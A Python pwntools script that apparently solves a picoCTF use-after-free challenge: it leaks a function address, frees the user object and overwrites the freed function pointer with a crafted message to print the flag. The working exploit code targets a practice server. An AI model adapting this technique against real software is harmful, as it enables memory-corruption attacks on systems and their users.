#!/usr/bin/env python3

from pwn import *

# exe = ELF("./vuln_patched")
# context.binary = exe

def main():
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    #p = process('./vuln_patched')
    p = remote('mercury.picoctf.net', 48259)
    #gdb.attach(p)
    #sleep(5)

    # Use after free vuln

    # Get the user menu
    # Press 'S' to execute the memory leak function

    # user address 0x804b060 using print &user
    # leaveMessage wont set user->whattodo, but it still calls doProcess

    # leak hahaexploitgobrrr address
    # free user
    # leave messages with the address for the leaked function
    # call

    # this works because it allocates 8 bytes, so if we send it 4 bytes, it will store that in the location that whattodo used to be in

    p.sendlineafter(b'(e)xit', b's') # leak address

    p.recvline() # \n
    resp = p.recvline() # contains leaked address
    leaked_address_int = u32(bytearray.fromhex(resp.strip()[-7:].rjust(8, b'0').decode('utf-8')), endian='big')
    log.info('Leaked address: {}'.format(hex(leaked_address_int)))

    log.info('Freeing user')
    p.sendlineafter(b'(e)xit', b'i') # free user
    p.sendlineafter(b'You\'re leaving already(Y/N)?', b'Y') # confirm account deletion

    log.info('Leaving message')
    p.sendlineafter(b'(e)xit', b'l') # create a message
    p.sendlineafter(b'try anyways:\n', p32(leaked_address_int)) # be very specific about what to sendlineafter, it sends the data as soon as it recieves the data

    flag_resp = p.recvline()
    log.info('Hopefully flag={}'.format(flag_resp))


if __name__ == "__main__":
    main()
